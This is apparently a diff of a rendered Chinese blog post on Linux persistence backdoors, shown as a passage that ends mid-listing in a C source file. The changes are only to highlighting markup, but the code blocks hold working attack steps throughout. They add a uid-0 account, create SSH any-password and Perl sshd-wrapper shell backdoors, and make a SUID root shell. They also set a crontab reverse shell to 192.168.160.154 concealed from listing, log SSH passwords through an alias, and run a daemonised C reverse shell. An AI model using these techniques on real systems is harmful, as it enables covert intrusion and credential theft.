 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># 查询特权用户（uid = 0）</span>
-awk -F: <span class="s1">&#39;$3==0{print $1}&#39;</span> /etec/passwd
-<span class="c1"># 查询可以远程登录的帐号信息</span>
-awk <span class="s1">&#39;/\$1|\$6/{print $1}&#39;</span> /etc/shadow
-<span class="c1"># 除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限</span>
-more /etc/sudoers <span class="p">|</span> grep -v <span class="s2">&#34;^#\|^</span>$<span class="s2">&#34;</span> <span class="p">|</span> grep <span class="s2">&#34;ALL=(ALL)&#34;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 查询特权用户（uid = 0）</span>
+</span></span><span class="line"><span class="cl">awk -F: <span class="s1">&#39;$3==0{print $1}&#39;</span> /etec/passwd
+</span></span><span class="line"><span class="cl"><span class="c1"># 查询可以远程登录的帐号信息</span>
+</span></span><span class="line"><span class="cl">awk <span class="s1">&#39;/\$1|\$6/{print $1}&#39;</span> /etc/shadow
+</span></span><span class="line"><span class="cl"><span class="c1"># 除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限</span>
+</span></span><span class="line"><span class="cl">more /etc/sudoers <span class="p">|</span> grep -v <span class="s2">&#34;^#\|^</span>$<span class="s2">&#34;</span> <span class="p">|</span> grep <span class="s2">&#34;ALL=(ALL)&#34;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="2-增加超级用户">2. 增加超级用户</h3>
 <p>在完成用户添加后，可以对添加的用户赋予超级用户权限。</p>
@@ -560,8 +558,8 @@ more /etc/sudoers <span class="p">|</span> grep -v <span class="s2">&#34;^#\|^</
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">echo</span> <span class="s2">&#34;v4ler1an❌0:0::/:/bin/sh&#34;</span> &gt;&gt; /etc/passwd
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;v4ler1an❌0:0::/:/bin/sh&#34;</span> &gt;&gt; /etc/passwd
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>如果目标系统不允许uid=0的用户远程登录，可以增加一个普通用户账号：</p>
 <div class="highlight"><div class="chroma">
@@ -569,8 +567,8 @@ more /etc/sudoers <span class="p">|</span> grep -v <span class="s2">&#34;^#\|^</
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">echo</span> <span class="s2">&#34;v4ler1an:👎-1👎-1👎-1:500&#34;</span> &gt;&gt; /etc/shadow
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;v4ler1an:👎-1👎-1👎-1:500&#34;</span> &gt;&gt; /etc/shadow
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>有些情况下添加不成功可能是因为密码强度不够，可以适当增加密码强度。</p>
 <h3 id="1-ssh后门">1. SSH后门</h3>
@@ -581,8 +579,8 @@ more /etc/sudoers <span class="p">|</span> grep -v <span class="s2">&#34;^#\|^</
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">ln -sf /usr/sbin/sshd /tmp/su<span class="p">;</span> /tmp/su -oPort<span class="o">=</span>5555<span class="p">;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ln -sf /usr/sbin/sshd /tmp/su<span class="p">;</span> /tmp/su -oPort<span class="o">=</span>5555<span class="p">;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>攻击机直接ssh登录</p>
 <div class="highlight"><div class="chroma">
@@ -590,8 +588,8 @@ more /etc/sudoers <span class="p">|</span> grep -v <span class="s2">&#34;^#\|^</
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">ssh root@x.x.x.x -p <span class="m">5555</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh root@x.x.x.x -p <span class="m">5555</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>这里端口可以任意，但是<code>/tmp/su</code>部分有限制。可以使用任意密码进行登录，在sshd服务配置运行PAM认证的前提下，PAM配置文件中控制标志为<code>sufficient</code>时只要<code>pam_rootok</code>模块检测uid为0即root权限即可成功认证登陆。通过软连接的方式，实质上PAM认证是通过软连接的文件名 <code>/tmp/su</code> 在<code>/etc/pam.d/</code>目录下寻找对应的PAM配置文件(如: <code>/etc/pam.d/su</code>)，任意密码登陆的核心是<code>auth sufficient pam_rootok.so</code>，所以只要PAM配置文件中包含此配置即可SSH任意密码登陆，除了su中之外还有chsh、chfn同样可以。具体原理详见<a href="http://www.91ri.org/16803.html" target="_blank" rel="noopener noreffer">Linux的一个后门引发对PAM的探究</a>。</p>
 <p>缺点：易被排查，通过进程、端口可以轻松看到异常，使用<code>kill -s 9 PID</code>即可清除后门。</p>
@@ -603,8 +601,8 @@ more /etc/sudoers <span class="p">|</span> grep -v <span class="s2">&#34;^#\|^</
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">ssh-keygen -t rsa
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh-keygen -t rsa
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>进入<code>/root/.ssh</code>，将公钥<code>id_rsa.pub</code>的内容复制到目标主机（是否上传替换文件取决于具体情况），在<code>/root/.ssh/authorized_keys</code>中追加<code>id_rsa.pub</code>中的内容，配置完成。(有些系统没有keys文件，可以自行创建一个。)</p>
 <p>缺点：易被排查，检查<code>/root/.ssh/authorized_keys</code>是否被修改，清理不受信的公钥即可清除后门。</p>
@@ -621,14 +619,14 @@ more /etc/sudoers <span class="p">|</span> grep -v <span class="s2">&#34;^#\|^</
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">cd</span> /usr/sbin/
-mv sshd ../bin/
-<span class="nb">echo</span> <span class="s1">&#39;#!/usr/bin/perl&#39;</span> &gt;sshd
-<span class="nb">echo</span> <span class="s1">&#39;exec &#34;/bin/sh&#34; if(getpeername(STDIN) =~ /^..4A/);&#39;</span> &gt;&gt;sshd
-<span class="nb">echo</span> <span class="s1">&#39;exec{&#34;/usr/bin/sshd&#34;} &#34;/usr/sbin/sshd&#34;,@ARGV,&#39;</span> &gt;&gt;sshd
-chmod u+x sshd
-/etc/init.d/sshd restart
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">cd</span> /usr/sbin/
+</span></span><span class="line"><span class="cl">mv sshd ../bin/
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;#!/usr/bin/perl&#39;</span> &gt;sshd
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;exec &#34;/bin/sh&#34; if(getpeername(STDIN) =~ /^..4A/);&#39;</span> &gt;&gt;sshd
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;exec{&#34;/usr/bin/sshd&#34;} &#34;/usr/sbin/sshd&#34;,@ARGV,&#39;</span> &gt;&gt;sshd
+</span></span><span class="line"><span class="cl">chmod u+x sshd
+</span></span><span class="line"><span class="cl">/etc/init.d/sshd restart
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>完成后执行<code>cat sshd</code>进行验证，输出如下则说明配置成功：</p>
 <div class="highlight"><div class="chroma">
@@ -638,10 +636,10 @@ chmod u+x sshd
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="cp">#!/usr/bin/perl
-</span><span class="cp"></span><span class="nb">exec</span> <span class="s2">&#34;/bin/sh&#34;</span> <span class="k">if</span><span class="o">(</span>getpeername<span class="o">(</span>STDIN<span class="o">)</span> <span class="o">=</span>~ /^..4A/<span class="o">)</span><span class="p">;</span>
-exec<span class="o">{</span><span class="s2">&#34;/usr/bin/sshd&#34;</span><span class="o">}</span> <span class="s2">&#34;/usr/sbin/sshd&#34;</span>,@ARGV,
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/usr/bin/perl
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="nb">exec</span> <span class="s2">&#34;/bin/sh&#34;</span> <span class="k">if</span><span class="o">(</span>getpeername<span class="o">(</span>STDIN<span class="o">)</span> <span class="o">=</span>~ /^..4A/<span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">exec<span class="o">{</span><span class="s2">&#34;/usr/bin/sshd&#34;</span><span class="o">}</span> <span class="s2">&#34;/usr/sbin/sshd&#34;</span>,@ARGV,
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>攻击机上执行：</p>
 <div class="highlight"><div class="chroma">
@@ -649,8 +647,8 @@ exec<span class="o">{</span><span class="s2">&#34;/usr/bin/sshd&#34;</span><span
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">socat STDIO TCP4:x.x.x.x:22,sourceport<span class="o">=</span><span class="m">13377</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">socat STDIO TCP4:x.x.x.x:22,sourceport<span class="o">=</span><span class="m">13377</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>这里的sourceport可以进行修改，但是需要使用python的struct标准库实现。</p>
 <div class="highlight"><div class="chroma">
@@ -665,15 +663,15 @@ exec<span class="o">{</span><span class="s2">&#34;/usr/bin/sshd&#34;</span><span
 </span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">python
-&gt;&gt;&gt; import struct
-&gt;&gt;&gt; <span class="nv">buffer</span> <span class="o">=</span> struct.pack<span class="o">(</span><span class="s1">&#39;&gt;I6&#39;</span>,19256<span class="o">)</span>
-&gt;&gt;&gt; print repr<span class="o">(</span>buffer<span class="o">)</span>
-<span class="s1">&#39;\x00\x00LF&#39;</span>
-&gt;&gt;&gt; <span class="nv">buffer</span> <span class="o">=</span> struct.pack<span class="o">(</span><span class="s1">&#39;&gt;I6&#39;</span>,13377<span class="o">)</span>
-&gt;&gt;&gt; print buffer
-4A
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python
+</span></span><span class="line"><span class="cl">&gt;&gt;&gt; import struct
+</span></span><span class="line"><span class="cl">&gt;&gt;&gt; <span class="nv">buffer</span> <span class="o">=</span> struct.pack<span class="o">(</span><span class="s1">&#39;&gt;I6&#39;</span>,19256<span class="o">)</span>
+</span></span><span class="line"><span class="cl">&gt;&gt;&gt; print repr<span class="o">(</span>buffer<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;\x00\x00LF&#39;</span>
+</span></span><span class="line"><span class="cl">&gt;&gt;&gt; <span class="nv">buffer</span> <span class="o">=</span> struct.pack<span class="o">(</span><span class="s1">&#39;&gt;I6&#39;</span>,13377<span class="o">)</span>
+</span></span><span class="line"><span class="cl">&gt;&gt;&gt; print buffer
+</span></span><span class="line"><span class="cl">4A
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>原理简单说明：<code>init</code>首先启动的是<code>/usr/sbin/sshd</code>,脚本执行到<code>getpeername</code>这里的时候，正则匹配会失败，于是执行下一句，启动<code>/usr/bin/sshd</code>，这是原始sshd。原始的sshd监听端口建立了tcp连接后，会fork一个子进程处理具体工作。这个子进程，没有什么检验，而是直接执行系统默认的位置的<code>/usr/sbin/sshd</code>，这样子控制权又回到脚本了。此时子进程标准输入输出已被重定向到套接字，<code>getpeername</code>能真的获取到客户端的TCP源端口，如果是19526就执行sh给个shell</p>
 <p>简单点就是从sshd程序fork出一个子进程，输入输出重定向到套接字，并对连过来的客户端端口进行判断。</p>
@@ -684,9 +682,9 @@ exec<span class="o">{</span><span class="s2">&#34;/usr/bin/sshd&#34;</span><span
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">ls -al /usr/sbin/sshd
-cat /usr/sbin/sshd
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ls -al /usr/sbin/sshd
+</span></span><span class="line"><span class="cl">cat /usr/sbin/sshd
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>如果想彻底恢复的话，需要进行ssh服务的重装。</p>
 <h4 id="4-ssh的隐身登录">4. ssh的隐身登录</h4>
@@ -700,12 +698,12 @@ cat /usr/sbin/sshd
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># 不被last\who\w等指令检测</span>
-ssh -T username@x.x.x.x /bin/bash -i
-
-<span class="c1"># 不记录ssh公钥在本地.ssh目录中</span>
-ssh -o <span class="nv">UserKnownHostFile</span><span class="o">=</span>/dev/null -T user@x.x.x.x /bin/bash -if
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 不被last\who\w等指令检测</span>
+</span></span><span class="line"><span class="cl">ssh -T username@x.x.x.x /bin/bash -i
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 不记录ssh公钥在本地.ssh目录中</span>
+</span></span><span class="line"><span class="cl">ssh -o <span class="nv">UserKnownHostFile</span><span class="o">=</span>/dev/null -T user@x.x.x.x /bin/bash -if
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="3-suid-shell">3. SUID Shell</h3>
 <p>需要配合普通用户进行使用。root权限下执行如下命令，普通用户运行/dev/.rootshell即可获得root权限：</p>
@@ -715,9 +713,9 @@ ssh -o <span class="nv">UserKnownHostFile</span><span class="o">=</span>/dev/nul
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">cp /bin/bash /dev/.rootshell
-chmod u+s /dev/.rootshell
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cp /bin/bash /dev/.rootshell
+</span></span><span class="line"><span class="cl">chmod u+s /dev/.rootshell
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>备注：bash2针对suid做了一些防护措施，需要使用-p参数来获取一个root shell。另外，普通用户执行这个SUID shell时，一定要使用全路径。该方法个人认为较为鸡肋，且bash版本现在较高，可利用性不高。</p>
 <h3 id="4-crontab后门文件落地">4. crontab后门（文件落地）</h3>
@@ -729,9 +727,9 @@ chmod u+s /dev/.rootshell
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="cp">#!/bin/bash
-</span><span class="cp"></span>bash -i &gt;<span class="p">&amp;</span> /dev/tcp/192.168.160.154/12345  0&gt;<span class="p">&amp;</span><span class="m">1</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>bash -i &gt;<span class="p">&amp;</span> /dev/tcp/192.168.160.154/12345  0&gt;<span class="p">&amp;</span><span class="m">1</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>并给脚本赋予相应权限：</p>
 <div class="highlight"><div class="chroma">
@@ -739,8 +737,8 @@ chmod u+s /dev/.rootshell
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">chmod +sx /etc/evil.sh
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">chmod +sx /etc/evil.sh
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Step 2：设置定时服务</p>
 <div class="highlight"><div class="chroma">
@@ -748,8 +746,8 @@ chmod u+s /dev/.rootshell
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">crontab -e
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">crontab -e
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>输入以下内容：</p>
 <div class="highlight"><div class="chroma">
@@ -759,10 +757,10 @@ chmod u+s /dev/.rootshell
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># exec per min</span>
-
-*/1 * * * * root /etc/evil.sh
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># exec per min</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">*/1 * * * * root /etc/evil.sh
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>重启crond服务，<code>service crond restart</code>，然后使用nc接收shell。</p>
 <p>上述方法在实际测试中成功了率较低，建议使用一句话后门：</p>
@@ -771,8 +769,8 @@ chmod u+s /dev/.rootshell
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="o">(</span>crontab -l<span class="p">;</span><span class="nb">printf</span> <span class="s2">&#34;*/1 * * * * /tmp/crontab_backdoor.sh;\rno crontab for `whoami`%100c\n&#34;</span><span class="o">)</span><span class="p">|</span>crontab -
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>crontab -l<span class="p">;</span><span class="nb">printf</span> <span class="s2">&#34;*/1 * * * * /tmp/crontab_backdoor.sh;\rno crontab for `whoami`%100c\n&#34;</span><span class="o">)</span><span class="p">|</span>crontab -
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>这种方式成功率更高，而且不易被<code>crontab -l</code>发现。</p>
 <p>其中关于crondtab的详细原理可以参考：<a href="https://cloud.tencent.com/developer/article/1683265" target="_blank" rel="noopener noreffer">https://cloud.tencent.com/developer/article/1683265</a></p>
@@ -783,9 +781,9 @@ chmod u+s /dev/.rootshell
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># 查看可以的定时任务列表</span>
-crontab -e
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 查看可以的定时任务列表</span>
+</span></span><span class="line"><span class="cl">crontab -e
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="5-alias欺骗文件落地">5. alias欺骗（文件落地）</h3>
 <p>可以通过<code>alias</code>命令来执行特定的命令时静默运行其他程序，从而达到启动后门，记录键值等作用。2个实例：</p>
@@ -797,8 +795,8 @@ crontab -e
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">alias</span> <span class="nv">ssh</span><span class="o">=</span><span class="s1">&#39;strace -o /tmp/sshpwd-`date    &#39;</span>+%d%h%m%s<span class="s1">&#39;`.log -e read,write,connect  -s2048 ssh&#39;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">alias</span> <span class="nv">ssh</span><span class="o">=</span><span class="s1">&#39;strace -o /tmp/sshpwd-`date    &#39;</span>+%d%h%m%s<span class="s1">&#39;`.log -e read,write,connect  -s2048 ssh&#39;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div></li>
 <li>
@@ -808,8 +806,8 @@ crontab -e
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">alias</span> <span class="nv">cat</span><span class="o">=</span><span class="s1">&#39;cat&amp;&amp;/root/.shell&#39;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">alias</span> <span class="nv">cat</span><span class="o">=</span><span class="s1">&#39;cat&amp;&amp;/root/.shell&#39;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div></li>
 </ol>
@@ -885,74 +883,74 @@ crontab -e
 </span><span class="lnt">67
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">// shell.c
-</span><span class="c1"></span>
-<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
-</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
-</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
-</span><span class="cp">#include</span> <span class="cpf">&lt;time.h&gt;</span><span class="cp">
-</span><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
-</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
-</span><span class="cp">#include</span> <span class="cpf">&lt;sys/stat.h&gt;</span><span class="cp">
-</span><span class="cp">#include</span> <span class="cpf">&lt;signal.h&gt;</span><span class="cp">
-</span><span class="cp"></span>
-<span class="cp">#define ERR_EXIT(m) 
-</span><span class="cp"></span><span class="k">do</span>
-<span class="p">{</span>
-    <span class="n">perror</span><span class="p">(</span><span class="n">m</span><span class="p">);</span>
-    <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
-<span class="p">}</span>
-<span class="k">while</span> <span class="p">(</span><span class="mi">0</span><span class="p">);</span>
-
-<span class="kt">void</span> <span class="nf">creat_daemon</span><span class="p">(</span><span class="kt">void</span><span class="p">);</span>
-<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
-<span class="p">{</span>
-    <span class="n">time_t</span> <span class="n">t</span><span class="p">;</span>
-    <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
-    <span class="n">creat_daemon</span><span class="p">();</span>
-    <span class="c1">// 将ip和端口进行替换
-</span><span class="c1"></span>    <span class="n">system</span><span class="p">(</span><span class="s">&#34;bash -i &gt;&amp; /dev/tcp/192.168.80.147/12345 0&gt;&amp;1&#34;</span><span class="p">);</span>
-    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-<span class="p">}</span>
-
-<span class="kt">void</span> <span class="nf">creat_daemon</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
-<span class="p">{</span>
-    <span class="n">pid_t</span> <span class="n">pid</span><span class="p">;</span>
-    <span class="kt">int</span> <span class="n">devnullfd</span><span class="p">,</span><span class="n">fd</span><span class="p">,</span><span class="n">fdtablesize</span><span class="p">;</span>
-    <span class="n">umask</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
-
-    <span class="n">pid</span> <span class="o">=</span> <span class="n">fork</span><span class="p">();</span>
-    <span class="k">if</span><span class="p">(</span> <span class="n">pid</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
-        <span class="n">ERR_EXIT</span><span class="p">(</span><span class="s">&#34;fork error&#34;</span><span class="p">);</span>
-    <span class="k">if</span><span class="p">(</span><span class="n">pid</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="p">)</span>
-        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_SUCCESS</span><span class="p">);</span>
-    <span class="k">if</span><span class="p">(</span><span class="n">setsid</span><span class="p">()</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
-        <span class="n">ERR_EXIT</span><span class="p">(</span><span class="s">&#34;SETSID ERROR&#34;</span><span class="p">);</span>
-    <span class="n">chdir</span><span class="p">(</span><span class="s">&#34;/&#34;</span><span class="p">);</span>
-
-    <span class="cm">/* close any open file descriptors */</span>
-    <span class="k">for</span><span class="p">(</span><span class="n">fd</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">fdtablesize</span> <span class="o">=</span> <span class="n">getdtablesize</span><span class="p">();</span> <span class="n">fd</span> <span class="o">&lt;</span> <span class="n">fdtablesize</span><span class="p">;</span> <span class="n">fd</span><span class="o">++</span><span class="p">)</span>
-        <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
-
-    <span class="n">devnullfd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">&#34;/dev/null&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
-
-    <span class="cm">/* make STDIN ,STDOUT and STDERR point to /dev/null */</span>
-    <span class="k">if</span> <span class="p">(</span><span class="n">devnullfd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
-        <span class="n">ERR_EXIT</span><span class="p">(</span><span class="s">&#34;can&#39;t open /dev/null&#34;</span><span class="p">);</span>
-    <span class="p">}</span>
-    <span class="k">if</span> <span class="p">(</span><span class="n">dup2</span><span class="p">(</span><span class="n">devnullfd</span><span class="p">,</span> <span class="n">STDIN_FILENO</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
-        <span class="n">ERR_EXIT</span><span class="p">(</span><span class="s">&#34;can&#39;t dup2 /dev/null to STDIN_FILENO&#34;</span><span class="p">);</span>
-    <span class="p">}</span>
-    <span class="k">if</span> <span class="p">(</span><span class="n">dup2</span><span class="p">(</span><span class="n">devnullfd</span><span class="p">,</span> <span class="n">STDOUT_FILENO</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
-        <span class="n">ERR_EXIT</span><span class="p">(</span><span class="s">&#34;can&#39;t dup2 /dev/null to STDOUT_FILENO&#34;</span><span class="p">);</span>
-    <span class="p">}</span>
-    <span class="k">if</span> <span class="p">(</span><span class="n">dup2</span><span class="p">(</span><span class="n">devnullfd</span><span class="p">,</span> <span class="n">STDERR_FILENO</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
-        <span class="n">ERR_EXIT</span><span class="p">(</span><span class="s">&#34;can&#39;t dup2 /dev/null to STDOUT_FILENO&#34;</span><span class="p">);</span>
-    <span class="p">}</span>
-    <span class="n">signal</span><span class="p">(</span><span class="n">SIGCHLD</span><span class="p">,</span><span class="n">SIG_IGN</span><span class="p">);</span> 
-    <span class="k">return</span><span class="p">;</span>
-<span class="p">}</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// shell.c
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;time.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/stat.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;signal.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="cp">#define ERR_EXIT(m) 
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="k">do</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">perror</span><span class="p">(</span><span class="n">m</span><span class="p">);</span>
